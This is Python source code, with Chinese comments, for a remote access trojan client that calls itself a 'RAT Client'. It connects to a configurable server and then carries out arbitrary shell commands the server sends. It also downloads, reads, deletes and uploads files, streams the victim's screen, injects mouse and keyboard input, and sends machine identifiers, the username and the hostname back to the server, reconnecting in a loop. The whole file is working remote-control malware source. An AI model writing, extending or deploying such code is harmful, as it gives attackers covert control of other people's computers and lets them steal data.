import socket
import subprocess
import json
import os
import base64
import time
from PIL import Image
import platform
import shutil
import tkinter as tk
from tkinter import messagebox
import threading
import ctypes
from ttkthemes import ThemedTk
import hashlib
import uuid

# 发送加锁，避免多线程发送数据时内容交叉
SEND_LOCK = threading.Lock()
# 屏幕流控制
_screen_thread = None
_screen_stop_event = threading.Event()

# 虚拟屏常量（用于 ctypes 回退）
SM_XVIRTUALSCREEN = 76
SM_YVIRTUALSCREEN = 77
SM_CXVIRTUALSCREEN = 78
SM_CYVIRTUALSCREEN = 79
# 鼠标事件常量（ctypes 回退）
MOUSEEVENTF_MOVE = 0x0001
MOUSEEVENTF_LEFTDOWN = 0x0002
MOUSEEVENTF_LEFTUP = 0x0004
MOUSEEVENTF_RIGHTDOWN = 0x0008
MOUSEEVENTF_RIGHTUP = 0x0010
MOUSEEVENTF_MIDDLEDOWN = 0x0020
MOUSEEVENTF_MIDDLEUP = 0x0040
MOUSEEVENTF_WHEEL = 0x0800
WHEEL_DELTA = 120
KEYEVENTF_KEYUP = 0x0002

try:
    import win32gui
    import win32ui
    import win32con
    import win32api

    WIN_AVAILABLE = True
except Exception:
    WIN_AVAILABLE = False

def take_screenshot():
    # 优先使用 pywin32 截屏（性能更好，支持多显示器虚拟屏）
    if WIN_AVAILABLE:
        try:
            ctypes.windll.user32.SetProcessDPIAware()
        except AttributeError:
            pass  # For older Windows versions
        hdesktop = win32gui.GetDesktopWindow()
        width, height = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN), win32api.GetSystemMetrics(
            win32con.SM_CYVIRTUALSCREEN)
        left, top = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN), win32api.GetSystemMetrics(
            win32con.SM_YVIRTUALSCREEN)
        desktop_dc = win32gui.GetWindowDC(hdesktop)
        img_dc = win32ui.CreateDCFromHandle(desktop_dc)
        mem_dc = img_dc.CreateCompatibleDC()
        screenshot = win32ui.CreateBitmap()
        screenshot.CreateCompatibleBitmap(img_dc, width, height)
        mem_dc.SelectObject(screenshot)
        mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
        bmpinfo = screenshot.GetInfo()
        bmpstr = screenshot.GetBitmapBits(True)
        img = Image.frombuffer('RGB', (bmpinfo['bmWidth'], bmpinfo['bmHeight']), bmpstr, 'raw', 'BGRX', 0, 1)
        mem_dc.DeleteDC()
        img_dc.DeleteDC()
        win32gui.ReleaseDC(hdesktop, desktop_dc)
        win32gui.DeleteObject(screenshot.GetHandle())
        return img

    # 回退方案：在 Windows 环境使用 Pillow 的 ImageGrab
    if platform.system().lower() == 'windows':
        try:
            try:
                ctypes.windll.user32.SetProcessDPIAware()
            except AttributeError:
                pass
            from PIL import ImageGrab
            # all_screens=True 可抓取多显示器
            return ImageGrab.grab(all_screens=True)
        except Exception as e:
            raise RuntimeError(f"Windows screenshot fallback failed: {e}")

    # 非 Windows 环境直接提示不支持
    raise RuntimeError("Screenshot only supported on Windows in this client build.")


def reliable_send(sock, data_dict):
    """将字典可靠地编码为JSON并附加换行符后发送（线程安全）"""
    try:
        json_data = json.dumps(data_dict).encode('utf-8') + b'\n'
        with SEND_LOCK:
            sock.sendall(json_data)
    except socket.error as e:
        print(f"[错误] 发送数据时发生Socket错误: {e}")
        raise


# --- command handlers (mapping) ---
def handle_cd(arg, state):
    if not arg:
        return {"output": "错误: 'cd' 需要目录参数。"}
    try:
        os.chdir(arg)
        state['cwd'] = os.getcwd()
        return {"output": f"已切换目录到: {state['cwd']}"}
    except Exception as e:
        return {"output": f"切换目录错误: {e}"}


def handle_download(arg, state):
    if not arg:
        return {"output": "错误: 'download' 需要文件路径。"}
    if os.path.exists(arg) and os.path.isfile(arg):
        with open(arg, 'rb') as f:
            encoded_content = base64.b64encode(f.read()).decode('utf-8')
        return {"file": os.path.basename(arg), "data": encoded_content, "source_path": arg}
    else:
        return {"output": f"错误: 文件 '{arg}' 不存在。"}


def handle_screenshot(arg, state):
    try:
        img = take_screenshot()
        img_path = "screen_temp.png"
        img.save(img_path)
        with open(img_path, 'rb') as f:
            encoded_img = base64.b64encode(f.read()).decode('utf-8')
        os.remove(img_path)
        return {"file": "screenshot.png", "data": encoded_img}
    except Exception as e:
        return {"output": f"截图失败: {e}"}


def handle_exec(arg, state):
    """把 action 当作可执行命令（cmd /c）"""
    full_command = arg or ""
    try:
        startupinfo = subprocess.STARTUPINFO() if os.name == 'nt' else None
        if startupinfo:
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        if os.name == 'nt':
            result = subprocess.run(['cmd.exe', '/c', full_command], capture_output=True, text=False,
                                    cwd=state['cwd'], timeout=30, check=False, startupinfo=startupinfo)
            output = (result.stdout + result.stderr).decode('gbk', errors='replace')
        else:
            result = subprocess.run(full_command, shell=True, capture_output=True, text=True, cwd=state['cwd'],
                                    timeout=30)
            output = result.stdout + result.stderr
        if not output.strip() and result.returncode != 0:
            output = f"命令执行完毕，退出码: {result.returncode}，但无输出。"
        return {"output": output}
    except Exception as e:
        return {"output": f"执行命令时发生错误: {e}"}


def handle_list_dir(arg, state):
    path = arg or state['cwd']
    try:
        entries = []
        with os.scandir(path) as it:
            for e in it:
                try:
                    stat = e.stat()
                    entries.append({
                        "name": e.name,
                        "is_dir": e.is_dir(),
                        "size": stat.st_size,
                        "mtime": int(stat.st_mtime)
                    })
                except Exception:
                    entries.append({"name": e.name, "is_dir": e.is_dir(), "size": 0, "mtime": 0})
        return {"dir_list": {"cwd": os.path.abspath(path), "entries": entries}}
    except Exception as e:
        return {"output": f"列目录失败: {e}"}


def handle_read_file(arg, state):
    if not arg:
        return {"output": "错误: read_file 需要路径参数。"}
    if not os.path.exists(arg) or not os.path.isfile(arg):
        return {"output": f"错误: 文件 '{arg}' 不存在或不是文件。"}
    try:
        size = os.path.getsize(arg)
        if size > 200 * 1024:
            return {"output": f"文件过大（{size} bytes），无法直接在线打开。请下载。"}
        with open(arg, 'rb') as f:
            raw = f.read()
        try:
            text = raw.decode('utf-8')
        except:
            try:
                text = raw.decode('gbk', errors='replace')
            except:
                text = base64.b64encode(raw).decode('utf-8')
                return {"file_text": text, "path": arg, "is_base64": True}
        return {"file_text": text, "path": arg, "is_base64": False}
    except Exception as e:
        return {"output": f"读取文件失败: {e}"}


def handle_delete_path(arg, state):
    if not arg:
        return {"output": "错误: delete_path 需要路径参数。"}
    try:
        if os.path.isdir(arg):
            shutil.rmtree(arg)
            return {"output": f"目录已删除: {arg}"}
        elif os.path.isfile(arg):
            os.remove(arg)
            return {"output": f"文件已删除: {arg}"}
        else:
            return {"output": "路径不存在。"}
    except Exception as e:
        return {"output": f"删除失败: {e}"}


def handle_upload_file_chunk(cmd, state):
    filename = cmd.get('filename')
    chunk_index = cmd.get('chunk_index', 0)
    data_b64 = cmd.get('data', '')
    is_last = cmd.get('is_last', False)
    if not filename or data_b64 is None:
        return {"output": "上传块缺少参数。"}
    try:
        mode = 'ab'
        with open(filename, mode) as f:
            f.write(base64.b64decode(data_b64))
        if is_last:
            return {"upload_ack": f"上传完成: {filename}"}
        else:
            return {"output": f"已写入块 {chunk_index} (文件: {filename})"}
    except Exception as e:
        return {"output": f"写入上传文件失败: {e}"}

# ========== 实时屏幕流（Windows） ==========

def _parse_kv_arg(arg: str):
    """解析形如 'fps=10,quality=70,width=1280' 的字符串为字典"""
    params = {}
    if not arg:
        return params
    try:
        for pair in str(arg).split(','):
            if not pair.strip():
                continue
            if '=' in pair:
                k, v = pair.split('=', 1)
                params[k.strip()] = v.strip()
    except Exception:
        pass
    return params


def _get_virtual_screen_metrics():
    """返回 (vx, vy, vw, vh) 对应虚拟屏左上角与宽高（像素）"""
    try:
        ctypes.windll.user32.SetProcessDPIAware()
    except Exception:
        pass
    if platform.system().lower() != 'windows':
        return 0, 0, 0, 0
    if WIN_AVAILABLE:
        vw = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
        vh = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
        vx = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
        vy = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
        return vx, vy, vw, vh
    # ctypes 回退
    user32 = ctypes.windll.user32
    vw = user32.GetSystemMetrics(SM_CXVIRTUALSCREEN)
    vh = user32.GetSystemMetrics(SM_CYVIRTUALSCREEN)
    vx = user32.GetSystemMetrics(SM_XVIRTUALSCREEN)
    vy = user32.GetSystemMetrics(SM_YVIRTUALSCREEN)
    return vx, vy, vw, vh


def _screen_stream_loop(sock: socket.socket, stop_event: threading.Event, fps=30, quality=60, max_width=1280):
    """循环抓取屏幕 -> JPEG(Base64) -> 通过TCP发送 JSON {type: 'screen_frame', data: ...}"""
    interval = max(0.01, 1.0 / max(1, int(fps)))
    print(f"[屏幕流] 启动: fps={fps}, quality={quality}, max_width={max_width}")
    while not stop_event.is_set():
        start_t = time.time()
        try:
            img = take_screenshot()
            # 记录原始捕获尺寸
            orig_w, orig_h = img.width, img.height
            if max_width and img.width > int(max_width):
                ratio = int(max_width) / float(img.width)
                new_size = (int(img.width * ratio), int(img.height * ratio))
                img = img.resize(new_size, Image.LANCZOS)
            frame_w, frame_h = img.width, img.height
            vx, vy, vw, vh = _get_virtual_screen_metrics()
            # 转JPEG
            from io import BytesIO
            bio = BytesIO()
            img = img.convert('RGB')
            img.save(bio, format='JPEG', quality=int(quality))
            frame_b64 = base64.b64encode(bio.getvalue()).decode('utf-8')
            reliable_send(sock, {
                'type': 'screen_frame',
                'data': frame_b64,
                'w': frame_w,
                'h': frame_h,
                'vx': vx,
                'vy': vy,
                'vw': vw,
                'vh': vh
            })
        except Exception as e:
            # 捕获异常避免线程退出
            print(f"[屏幕流] 捕获/发送帧失败: {e}")
            time.sleep(0.2)
        # 控制帧率
        elapsed = time.time() - start_t
        sleep_left = interval - elapsed
        if sleep_left > 0:
            # 支持随时停止
            stop_event.wait(timeout=sleep_left)
    print("[屏幕流] 停止")


def handle_start_screen(arg, state):
    global _screen_thread
    # 允许 Windows 平台，即使缺少 pywin32 也可通过 Pillow ImageGrab 回退
    if platform.system().lower() != 'windows':
        return {"output": "当前客户端非Windows，无法开启屏幕流。"}
    if 'socket' not in state or not state['socket']:
        return {"output": "尚未建立到服务器的套接字，无法开启屏幕流。"}
    if _screen_thread and _screen_thread.is_alive():
        return {"output": "屏幕流已在运行。"}
    params = _parse_kv_arg(arg)
    fps = int(params.get('fps', 30))
    quality = int(params.get('quality', 60))
    max_width = int(params.get('width', 1280))
    _screen_stop_event.clear()
    _screen_thread = threading.Thread(
        target=_screen_stream_loop,
        args=(state['socket'], _screen_stop_event, fps, quality, max_width),
        daemon=True
    )
    _screen_thread.start()
    return {"output": f"屏幕流已启动 (fps={fps}, quality={quality}, width={max_width})"}


def handle_stop_screen(arg, state):
    global _screen_thread
    _screen_stop_event.set()
    if _screen_thread and _screen_thread.is_alive():
        _screen_thread.join(timeout=2)
    _screen_thread = None
    return {"output": "屏幕流已停止。"}

# =======================================

# 输入控制函数（上移到 COMMAND_HANDLERS 之前，避免 mainloop 阻塞导致未定义）

def handle_mouse(arg, state):
    """处理鼠标事件：
    约定 arg 形式：
      - "move X Y"  绝对屏幕坐标（虚拟屏）
      - "down left|right|middle"
      - "up left|right|middle"
      - "click left|right|middle"
      - "wheel delta"  delta 每格 ±120
    """
    if platform.system().lower() != 'windows':
        return {"output": "仅支持在 Windows 客户端上进行远程输入。"}
    if not arg:
        return {"output": "mouse 命令缺少参数"}
    parts = str(arg).split()
    if not parts:
        return {"output": "mouse 命令参数无效"}

    action = parts[0].lower()
    btn_map = {
        'left': (MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP),
        'right': (MOUSEEVENTF_RIGHTDOWN, MOUSEEVENTF_RIGHTUP),
        'middle': (MOUSEEVENTF_MIDDLEDOWN, MOUSEEVENTF_MIDDLEUP)
    }

    try:
        if action == 'move' and len(parts) >= 3:
            x = int(float(parts[1]))
            y = int(float(parts[2]))
            if WIN_AVAILABLE:
                win32api.SetCursorPos((x, y))
            else:
                ctypes.windll.user32.SetCursorPos(x, y)
            return {"output": f"鼠标移动到 ({x},{y})"}

        if action in ('down', 'up', 'click') and len(parts) >= 2:
            btn = parts[1].lower()
            if btn not in btn_map:
                return {"output": f"未知按键: {btn}"}
            down_flag, up_flag = btn_map[btn]
            if WIN_AVAILABLE:
                if action == 'down':
                    win32api.mouse_event(down_flag, 0, 0, 0, 0)
                elif action == 'up':
                    win32api.mouse_event(up_flag, 0, 0, 0, 0)
                else:  # click
                    win32api.mouse_event(down_flag, 0, 0, 0, 0)
                    win32api.mouse_event(up_flag, 0, 0, 0, 0)
            else:
                u32 = ctypes.windll.user32
                if action == 'down':
                    u32.mouse_event(down_flag, 0, 0, 0, 0)
                elif action == 'up':
                    u32.mouse_event(up_flag, 0, 0, 0, 0)
                else:
                    u32.mouse_event(down_flag, 0, 0, 0, 0)
                    u32.mouse_event(up_flag, 0, 0, 0, 0)
            return {"output": f"鼠标{action} {btn}"}

        if action == 'wheel' and len(parts) >= 2:
            try:
                delta = int(float(parts[1]))
            except Exception:
                delta = 0
            if delta == 0:
                return {"output": "滚轮 delta=0 被忽略"}
            if WIN_AVAILABLE:
                win32api.mouse_event(MOUSEEVENTF_WHEEL, 0, 0, delta, 0)
            else:
                ctypes.windll.user32.mouse_event(MOUSEEVENTF_WHEEL, 0, 0, delta, 0)
            return {"output": f"滚轮 {delta}"}

        return {"output": f"不支持的 mouse 子命令: {action}"}
    except Exception as e:
        return {"output": f"mouse 执行失败: {e}"}


def _key_to_vk(key: str):
    k = (key or '').strip()
    if not k:
        return None
    # 兼容前端传来 VK_ 前缀
    if k.upper().startswith('VK_'):
        name = k.upper()
        if WIN_AVAILABLE and hasattr(win32con, name):
            return getattr(win32con, name)
        # 常见 VK 回退
        vk_map = {
            'VK_RETURN': 0x0D, 'VK_ESCAPE': 0x1B, 'VK_BACK': 0x08, 'VK_TAB': 0x09, 'VK_SPACE': 0x20,
            'VK_SHIFT': 0x10, 'VK_CONTROL': 0x11, 'VK_MENU': 0x12,
            'VK_LEFT': 0x25, 'VK_UP': 0x26, 'VK_RIGHT': 0x27, 'VK_DOWN': 0x28,
        }
        return vk_map.get(name)
    # 常用名称映射
    name_map = {
        'Enter': 0x0D, 'Escape': 0x1B, 'Backspace': 0x08, 'Tab': 0x09, ' ': 0x20, 'Space': 0x20,
        'Shift': 0x10, 'Control': 0x11, 'Alt': 0x12,
        'ArrowLeft': 0x25, 'ArrowUp': 0x26, 'ArrowRight': 0x27, 'ArrowDown': 0x28,
    }
    if k in name_map:
        return name_map[k]
    # 单字符（字母数字）
    if len(k) == 1:
        ch = k.upper()
        if 'A' <= ch <= 'Z':
            return ord(ch)
        if '0' <= ch <= '9':
            return ord(ch)
    return None


def handle_key(arg, state):
    """处理键盘事件：
    约定 arg 形式：
      - "down KEY"  KEY 可为 'A'、'Enter' 或 'VK_RETURN' 等
      - "up KEY"
      - "press KEY"
    """
    if platform.system().lower() != 'windows':
        return {"output": "仅支持在 Windows 客户端上进行远程输入。"}
    if not arg:
        return {"output": "key 命令缺少参数"}
    parts = str(arg).split()
    if not parts:
        return {"output": "key 命令参数无效"}
    action = parts[0].lower()
    key = ' '.join(parts[1:]) if len(parts) > 1 else ''
    vk = _key_to_vk(key)
    if vk is None:
        return {"output": f"无法识别按键: {key}"}
    try:
        if WIN_AVAILABLE:
            if action == 'down':
                win32api.keybd_event(vk, 0, 0, 0)
            elif action == 'up':
                win32api.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0)
            elif action == 'press':
                win32api.keybd_event(vk, 0, 0, 0)
                win32api.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0)
            else:
                return {"output": f"不支持的 key 子命令: {action}"}
        else:
            # ctypes 回退
            u32 = ctypes.windll.user32
            if action == 'down':
                u32.keybd_event(vk, 0, 0, 0)
            elif action == 'up':
                u32.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0)
            elif action == 'press':
                u32.keybd_event(vk, 0, 0, 0)
                u32.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0)
            else:
                return {"output": f"不支持的 key 子命令: {action}"}
        return {"output": f"key {action} {key}"}
    except Exception as e:
        return {"output": f"key 执行失败: {e}"}

COMMAND_HANDLERS = {
    "cd": lambda arg, state: handle_cd(arg, state),
    "download": lambda arg, state: handle_download(arg, state),
    "screenshot": lambda arg, state: handle_screenshot(arg, state),
    "exec": lambda arg, state: handle_exec(arg, state),
    "list_dir": lambda arg, state: handle_list_dir(arg, state),
    "read_file": lambda arg, state: handle_read_file(arg, state),
    "delete_path": lambda arg, state: handle_delete_path(arg, state),
    "upload_file_chunk": lambda arg, state: handle_upload_file_chunk(arg, state),
    # 屏幕流控制
    "start_screen": lambda arg, state: handle_start_screen(arg, state),
    "stop_screen": lambda arg, state: handle_stop_screen(arg, state),
    # 输入控制
    "mouse": lambda arg, state: handle_mouse(arg, state),
    "key": lambda arg, state: handle_key(arg, state)
}


def main_loop(server_ip, server_port):
    """
    客户端主函数，循环连接和处理命令。
    现在接受 server_ip 和 server_port 作为参数。
    """
    buffer = b''
    state = {'cwd': os.getcwd(), 'socket': None}
    while True:
        client_socket = None
        try:
            print(f"[调试] 尝试连接服务器 {server_ip}:{server_port}...")
            client_socket = socket.socket()
            client_socket.connect((server_ip, server_port))
            print(f"[+] 已连接到服务器 {server_ip}:{server_port}")
            state['cwd'] = os.getcwd()
            state['socket'] = client_socket

            os_info = f"{platform.system()} {platform.release()}"
            
            # 生成设备指纹和获取硬件信息
            device_fingerprint = generate_device_fingerprint()
            hardware_id = get_hardware_id()
            mac_address = get_mac_address()
            hostname = platform.node()

            try:
                connection_info = {
                    "status": "connected", 
                    "cwd": state['cwd'], 
                    "user": os.getlogin(), 
                    "os": os_info,
                    "device_fingerprint": device_fingerprint,
                    "hardware_id": hardware_id,
                    "mac_address": mac_address,
                    "hostname": hostname
                }
                reliable_send(client_socket, connection_info)
            except Exception as e:
                print(f"[错误] 发送初始连接信息失败: {e}")
                break

            while True:
                try:
                    part = client_socket.recv(4096)
                    if not part:
                        print("[调试] 服务器关闭了连接。")
                        break
                    buffer += part
                except socket.error as e:
                    print(f"[错误] 接收数据时发生Socket错误: {e}")
                    break

                while b'\n' in buffer:
                    message, buffer = buffer.split(b'\n', 1)
                    try:
                        cmd_data = json.loads(message.decode('utf-8'))
                    except (json.JSONDecodeError, UnicodeDecodeError) as e:
                        print(f"[错误] 解析收到的消息失败: {e}")
                        continue

                    action = cmd_data.get("action")
                    if not action:
                        try:
                            reliable_send(client_socket, {"output": "错误: 命令缺少 'action' 字段"})
                        except:
                            pass
                        continue

                    try:
                        handler = COMMAND_HANDLERS.get(action)
                        if handler:
                            if action == "upload_file_chunk":
                                result = handler(cmd_data, state)
                            else:
                                arg = cmd_data.get("arg", "")
                                result = handler(arg, state)
                        else:
                            result = handle_exec(
                                action + (" " + cmd_data.get("arg", "") if cmd_data.get("arg") else ""), state)

                        if isinstance(result, dict):
                            reliable_send(client_socket, result)
                        else:
                            reliable_send(client_socket, {"output": str(result)})
                    except socket.error as e:
                        print(f"[错误] 发送响应时Socket错误: {e}")
                        break
                    except Exception as e_proc:
                        print(f"[错误] 处理命令时发生错误: {e_proc}")
                        try:
                            reliable_send(client_socket, {"output": f"处理命令时发生错误: {e_proc}"})
                        except:
                            break

        except socket.error as e_sock:
            print(f"[错误] 客户端 Socket 异常: {e_sock}")
        except Exception as e_main:
            print(f"[错误] 客户端主循环异常: {e_main}")
        finally:
            # 断开连接时确保停止屏幕流线程
            _screen_stop_event.set()
            try:
                if _screen_thread and _screen_thread.is_alive():
                    _screen_thread.join(timeout=1)
            except Exception:
                pass
            if client_socket:
                try:
                    client_socket.close()
                except Exception:
                    pass

        buffer = b''
        print("[调试] 5秒后尝试重新连接...")
        time.sleep(5)


class ClientUI(ThemedTk):  # 使用 ThemedTk 替代 tk.Tk
    def __init__(self, connect_callback):
        super().__init__(theme="equilux")  # 选择一个好看的主题，例如 "equilux"
        self.connect_callback = connect_callback
        self.title("RAT Client Configuration")
        self.geometry("400x250")  # 稍微加大窗口
        self.resizable(False, False)  # 禁止调整窗口大小

        # 定义字体
        self.font_large = ("Helvetica", 12)
        self.font_button = ("Helvetica", 12, "bold")

        self.create_widgets()
        self.connection_thread = None

        # 绑定回车键事件
        self.bind('<Return>', lambda event=None: self.start_connection())

    def create_widgets(self):
        main_frame = tk.Frame(self, padx=25, pady=25)
        main_frame.pack(fill="both", expand=True)

        tk.Label(main_frame, text="Server IP:", font=self.font_large).grid(row=0, column=0, sticky="w", pady=10)
        self.ip_entry = tk.Entry(main_frame, font=self.font_large)
        self.ip_entry.insert(0, "192.168.242.102")
        self.ip_entry.grid(row=0, column=1, pady=10, sticky="ew")

        tk.Label(main_frame, text="Server Port:", font=self.font_large).grid(row=1, column=0, sticky="w", pady=10)
        self.port_entry = tk.Entry(main_frame, font=self.font_large)
        self.port_entry.insert(0, "2383")
        self.port_entry.grid(row=1, column=1, pady=10, sticky="ew")

        tk.Label(main_frame, text="Key:", font=self.font_large).grid(row=2, column=0, sticky="w", pady=10)
        self.key_entry = tk.Entry(main_frame, font=self.font_large, show="*")
        self.key_entry.grid(row=2, column=1, pady=10, sticky="ew")

        self.connect_button = tk.Button(main_frame, text="Connect", command=self.start_connection,
                                        font=self.font_button, relief="groove")
        self.connect_button.grid(row=3, column=0, columnspan=2, pady=15, sticky="ew")

        self.status_label = tk.Label(main_frame, text="Status: Not Connected", fg="#FF4C4C", font=self.font_large)
        self.status_label.grid(row=4, column=0, columnspan=2)

        main_frame.grid_columnconfigure(1, weight=1)

    def start_connection(self):
        self.ip = self.ip_entry.get().strip()
        self.port = self.port_entry.get().strip()
        # self.key = self.key_entry.get() # Key is not used in your current logic

        if not self.ip or not self.port.isdigit():
            messagebox.showerror("Invalid Input", "Please enter a valid IP address and port number.")
            return

        self.connect_button["state"] = "disabled"
        self.status_label.config(text="Status: Connecting...", fg="#FFA500")

        self.connection_thread = threading.Thread(target=self.run_connection)
        self.connection_thread.daemon = True
        self.connection_thread.start()

    def run_connection(self):
        try:
            self.update_status("Connected", "#00C853")
            self.connect_callback(self.ip, int(self.port))
        except Exception as e:
            self.update_status(f"Connection Failed: {e}", "#FF4C4C")
            self.connect_button["state"] = "normal"

    def update_status(self, text, color):
        self.status_label.config(text=f"Status: {text}", fg=color)
        if text.startswith("Connection Failed"):
            self.connect_button["state"] = "normal"


def get_hardware_id():
    """获取硬件ID"""
    try:
        sysname = platform.system()
        if sysname == "Windows":
            # 优先从注册表获取 MachineGuid（稳定且不依赖已弃用的 wmic）
            try:
                import winreg
                try:
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography") as key:
                        value, _ = winreg.QueryValueEx(key, "MachineGuid")
                        if value:
                            return str(value).strip()
                except Exception as e:
                    print(f"[警告] 读取注册表MachineGuid失败: {e}")

                # 回退：通过 PowerShell 获取硬件 UUID
                try:
                    ps_cmd = "Get-CimInstance Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"
                    result = subprocess.run([
                        'powershell', '-NoProfile', '-Command', ps_cmd
                    ], capture_output=True, text=True, timeout=10)
                    if result.returncode == 0:
                        out = result.stdout.strip()
                        if out:
                            first_line = out.splitlines()[0].strip()
                            if first_line and first_line not in ("00000000-0000-0000-0000-000000000000",):
                                return first_line
                except Exception as e:
                    print(f"[警告] 通过PowerShell获取UUID失败: {e}")

                # 进一步回退：通过 PowerShell 获取主板序列号
                try:
                    ps_cmd = "Get-CimInstance Win32_BaseBoard | Select-Object -ExpandProperty SerialNumber"
                    result = subprocess.run([
                        'powershell', '-NoProfile', '-Command', ps_cmd
                    ], capture_output=True, text=True, timeout=10)
                    if result.returncode == 0:
                        out = result.stdout.strip()
                        if out:
                            first_line = out.splitlines()[0].strip()
                            if first_line and first_line.lower() != 'serialnumber':
                                return first_line
                except Exception as e:
                    print(f"[警告] 通过PowerShell获取主板序列号失败: {e}")

            except Exception as e:
                # 捕获 Windows 分支内部可能的总体异常
                print(f"[警告] Windows硬件ID获取失败: {e}")

        elif sysname == "Linux":
            # Linux: 获取机器ID
            try:
                with open('/etc/machine-id', 'r') as f:
                    return f.read().strip()
            except:
                try:
                    with open('/var/lib/dbus/machine-id', 'r') as f:
                        return f.read().strip()
                except:
                    pass
        elif sysname == "Darwin":  # macOS
            # macOS: 获取硬件UUID
            result = subprocess.run(['system_profiler', 'SPHardwareDataType'],
                                     capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'Hardware UUID' in line:
                        return line.split(':')[1].strip()
    except Exception as e:
        print(f"[警告] 获取硬件ID失败: {e}")

    # 如果无法获取硬件ID，生成一个基于MAC地址的ID
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
                        for elements in range(0, 2*6, 2)][::-1])
        return hashlib.md5(mac.encode()).hexdigest()
    except:
        return None

def get_mac_address():
    """获取MAC地址"""
    try:
        mac = uuid.getnode()
        mac_str = ':'.join(['{:02x}'.format((mac >> elements) & 0xff) 
                           for elements in range(0,2*6,2)][::-1])
        return mac_str
    except Exception as e:
        print(f"[警告] 获取MAC地址失败: {e}")
        return None

def generate_device_fingerprint():
    """生成设备指纹"""
    try:
        # 收集设备信息
        info_parts = []
        
        # 硬件ID
        hardware_id = get_hardware_id()
        if hardware_id:
            info_parts.append(f"hw:{hardware_id}")
        
        # MAC地址
        mac = get_mac_address()
        if mac:
            info_parts.append(f"mac:{mac}")
        
        # 操作系统信息
        os_info = f"{platform.system()}:{platform.release()}"
        info_parts.append(f"os:{os_info}")
        
        # 主机名
        try:
            hostname = platform.node()
            if hostname:
                info_parts.append(f"host:{hostname}")
        except:
            pass
        
        # 如果没有任何信息，使用随机UUID
        if not info_parts:
            return str(uuid.uuid4())
        
        # 生成指纹
        fingerprint_data = "|".join(info_parts)
        fingerprint = hashlib.sha256(fingerprint_data.encode()).hexdigest()
        return fingerprint
        
    except Exception as e:
        print(f"[警告] 生成设备指纹失败: {e}")
        return str(uuid.uuid4())


if __name__ == '__main__':
    def on_connect_button_click(ip, port):
        # 启动主循环，并在一个新线程中运行，以免阻塞UI
        main_thread = threading.Thread(target=main_loop, args=(ip, port), daemon=True)
        main_thread.start()


    # 实例化并运行UI
    app = ClientUI(on_connect_button_click)
    app.mainloop()